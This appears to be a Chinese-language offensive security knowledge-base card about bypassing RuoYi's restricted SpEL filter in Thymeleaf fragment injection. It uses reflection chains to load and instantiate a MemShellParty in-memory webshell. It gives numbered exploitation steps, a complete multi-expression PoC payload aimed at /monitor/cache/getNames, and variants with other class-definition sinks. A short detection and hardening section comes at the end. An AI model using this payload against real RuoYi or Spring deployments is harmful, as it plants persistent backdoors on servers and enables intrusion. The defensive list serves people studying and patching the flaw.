---
id: web-java-expression-spel-restricted-reflection-memshell
title: SpEL 禁用 T()/new 时用反射链构造对象并注入内存马
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-restricted-reflection-chain-memshell
tags:
- spel
- ssti
- reflection
- restricted-mode
- memshell
- defineclass
- thymeleaf
- ruoyi
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: RuoYi 4.8.1、4.8.2 受影响；4.8.3 修复
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:36:02+08:00'
  notes: 已对照原文核对；containsSpELInstantiationOrStaticOrParam 绕过、多表达式共享上下文、MemShellParty SpELSpringGzip 反射链与内存马连接截图一致；原文提示 getMethods 顺序随 JDK 不同，卡片已保留该注意点；未本地复现
url: /docs/web/java/expression/spel/web-java-expression-spel-restricted-reflection-memshell/
draft: false
kb_aliases:
- SpEL 反射链绕过
- containsSpELInstantiationOrStaticOrParam 绕过
- 无 T() 无 new 构造对象
- ReflectUtils.defineClass 内存马
- Thymeleaf 多表达式共享上下文
---

## 一句话结论

当 SpEL 受限模式通过 `containsSpELInstantiationOrStaticOrParam` 拦截 `T(SomeClass)` 与 `new SomeClass` 时，仍可用 `''.getClass().forName(...)`、`getMethods().?[name=='...'][0]`、`getConstructor(...).newInstance(...)` 等反射 API 加载并实例化任意类；把多个 `*${#var=...}` 表达式放在同一个 Thymeleaf fragment 中共享上下文，可逐步构造 `Object[]`、`GZIPInputStream`、`URLClassLoader`，最后用 `ReflectUtils.defineClass(...).newInstance()` 加载 MemShellParty 生成的内存马类。

## 原理

- `SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam` 从后向前扫描，主要识别：
  - `new` 关键字（要求前面不是标识符字符、后面是空白）；
  - `param` 关键字；
  - `(` 且前一个字符是静态访问标记（如 `T`）。
  它拦截的是语法层面的 `T(...)` 与 `new`，并不拦截反射 API。
- 反射链可以完全绕开这两个关键字：
  - `''.getClass().forName('java.lang.Runtime')` 获得 `Class`；
  - `getMethods().?[name=='getRuntime'][0].invoke(null)` 调用静态方法；
  - `getConstructor(''.getClass().forName('[B')).newInstance(#a)` 调用构造方法；
  - `getMethods().?[name=='exec'][1].invoke(...)` 选择重载。
- **多表达式共享上下文**：一个 `fragment` 中可以放多个 `*${...}` 表达式，它们在同一 Thymeleaf/SpEL 求值上下文中执行。`*${#a=...}` 定义的 `#a` 可被后续表达式使用，因此能把“创建数组 → 解码字节 → 构造流 → 定义类”拆成多步，而不需要单条超长表达式。
- 内存马注入链（以 MemShellParty 的 `SpELSpringGzip` 为例）：
  1. `Array.newInstance(Object.class, 1)` 创建 `Object[]`；
  2. `Base64Utils.decodeFromString(base64)` 得到 gzip 字节，放入 `Object[0]`；
  3. `new ByteArrayInputStream(Object[])` 包成字节流（反射构造，避开 `new`）；
  4. `new GZIPInputStream(InputStream)` 解压；
  5. 取 `Thread.currentThread().getContextClassLoader()`；
  6. `new URLClassLoader(new URL[0], parent)` 作为定义类的加载器；
  7. `StreamUtils.copyToByteArray(GZIPInputStream)` 得到类字节；
  8. `ReflectUtils.defineClass('Chat', bytes, loader).newInstance()` 定义并实例化内存马类。
- `org.springframework.cglib.core.ReflectUtils#defineClass(String, byte[], ClassLoader)` 是 Spring 自带的类定义入口，绕过 `T()`/`new` 后仍可直接调用。
- 不同 JDK 的 `getMethods()` 返回顺序可能不同，同名重载的索引（如 `[0]`、`[1]`）会变化；需要按参数类型/方法签名选择，不能硬编码索引。

## 触发条件

- 已通过 RuoYi Thymeleaf 片段 SSTI（或其它 SpEL 注入点）进入表达式求值。
- 目标使用受限 SpEL，`T(...)` 与 `new` 被拦截，但 `getClass`、`forName`、`getMethods`、`getConstructor`、`newInstance`、`invoke` 未被禁用。
- classpath 中存在 Spring 的 `StreamUtils`、`Base64Utils`、`cglib.core.ReflectUtils`（RuoYi/Spring 应用通常具备）。
- 能在一个 `fragment` 中提交多个表达式，且求值上下文在表达式之间保持。
- 目标 JDK 与内存马字节码版本匹配（MemShellParty 可选 JRE 版本）。

## 利用步骤

1. 用 MemShellParty 生成内存马，打包方式选 `SpELSpringGzip`，得到注入器类名、内存马类名与 gzip+Base64 字节。
2. 在同一个 `fragment` 中按顺序写多个 `*${...}` 表达式：
   - 创建 `Object[]`；
   - 解码 Base64 并写入 `Object[0]`；
   - 构造 `ByteArrayInputStream`；
   - 构造 `GZIPInputStream`；
   - 取当前线程上下文类加载器；
   - 构造空 `URL[]` 与 `URLClassLoader`；
   - `StreamUtils.copyToByteArray` 取类字节；
   - `ReflectUtils.defineClass(...).newInstance()`。
3. 通过 `/monitor/cache/getNames` 发送 `fragment=__|<表达式列表>|__`。
4. 观察响应：成功时通常返回空 200 或模板异常；随后访问内存马约定的 URL/请求头验证。
5. 若失败，按异常调整方法索引/签名（不同 JDK 的 `getMethods` 顺序不同），或改用 `getDeclaredMethod` + 参数类型精确匹配。

## PoC

结构示例（`<GZIP_B64>` 为 MemShellParty 生成的 Base64 gzip 数据，`Chat` 为内存马类名）：

```text
fragment=__|
*${#a=''.getClass().forName('java.lang.reflect.Array').getMethods.?[name=='newInstance'][0].invoke(null,''.getClass().forName('java.lang.Object'),1)},
*${#a[0]=''.getClass().forName('org.springframework.util.Base64Utils').getMethods.?[name=='decodeFromString'][0].invoke(null,'<GZIP_B64>')},
*${#x=''.getClass().forName('java.io.ByteArrayInputStream').getConstructor(''.getClass().forName('[B')).newInstance(#a)},
*${#g=''.getClass().forName('java.util.zip.GZIPInputStream').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(#x)},
*${#c=''.getClass().forName('java.lang.reflect.Array').getMethods.?[name=='newInstance'][0].invoke(null,''.getClass().forName('java.net.URL'),0)},
*${#v=''.getClass().forName('java.lang.Thread').getMethods.?[name=='currentThread'][0].invoke(null)},
*${#b=''.getClass().forName('java.net.URLClassLoader').getConstructor(''.getClass().forName('[Ljava.net.URL;'),''.getClass().forName('java.lang.ClassLoader')).newInstance(#c,#v.getClass().getMethods.?[name=='getContextClassLoader'][0].invoke(#v))},
*${#s=''.getClass().forName('org.springframework.util.StreamUtils').getMethods.?[name=='copyToByteArray'][0].invoke(null,#g)},
*${''.getClass().forName('org.springframework.cglib.core.ReflectUtils').getMethods.?[name=='defineClass'][1].invoke(null,'Chat',#s,#b).newInstance()}
|__
```

最小验证（只创建 `Object[]`，确认多表达式共享上下文）：

```text
fragment=__|*${#a=''.getClass().forName('java.lang.reflect.Array').getMethods.?[name=='newInstance'][0].invoke(null,''.getClass().forName('java.lang.Object'),1)}|__
```

## 变体与关联

- 变体：用 `getDeclaredMethod(name, paramTypes...)` 精确选择重载，避免不同 JDK 的 `getMethods()` 顺序差异。
- 变体：类定义 sink 可替换为 `sun.misc.Unsafe.defineClass`、`MethodHandles.Lookup.defineClass`、`URLClassLoader` 加载远程/本地 class。
- 变体：MemShellParty 还支持 JXPath/JEXL/BeanShell/Groovy/Freemarker/Velocity 等注入语义；本卡是 SpEL 反射链版本。
- 变体：如果目标未拦截 `T()`，可直接用 `T(org.springframework.cglib.core.ReflectUtils).defineClass(...)`，无需反射链。
- 关联：[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]] 提供入口与 `$$` 绕过；本卡聚焦受限 SpEL 下无 `T()`/`new` 的对象构造与内存马注入。

## 检测与防御

- 修复：升级 RuoYi 4.8.3；同时修复 `containsExpression` 的双写绕过。
- 修复：SpEL 使用 `SimpleEvaluationContext` 或自定义受限 `EvaluationContext`，禁用 `getClass`、`forName`、`getMethods`、`getConstructor`、`newInstance`、`invoke`、`defineClass` 等反射调用。
- 修复：Thymeleaf 片段名使用固定白名单，禁止用户输入进入 `template :: fragment` 选择器。
- 加固：限制 `org.springframework.cglib.core.ReflectUtils#defineClass`、`Unsafe#defineClass`、`MethodHandles.Lookup#defineClass` 等类定义入口的可用性；启用 SecurityManager/模块化限制（评估兼容性）。
- 检测：请求中出现 `getClass().forName`、`getMethods.?[name==`、`getConstructor`、`newInstance`、`ReflectUtils`、`defineClass`、`GZIPInputStream`、`URLClassLoader` 等组合。
- 检测：JVM 中出现未知类加载、动态定义类、异常内存马 URL；Thymeleaf 模板异常堆栈含 `SpelExpression` 与反射调用。
- 加固：后台账号最小权限；`monitor:cache:view` 仅授予必要人员；管理端限制来源 IP 与强认证。
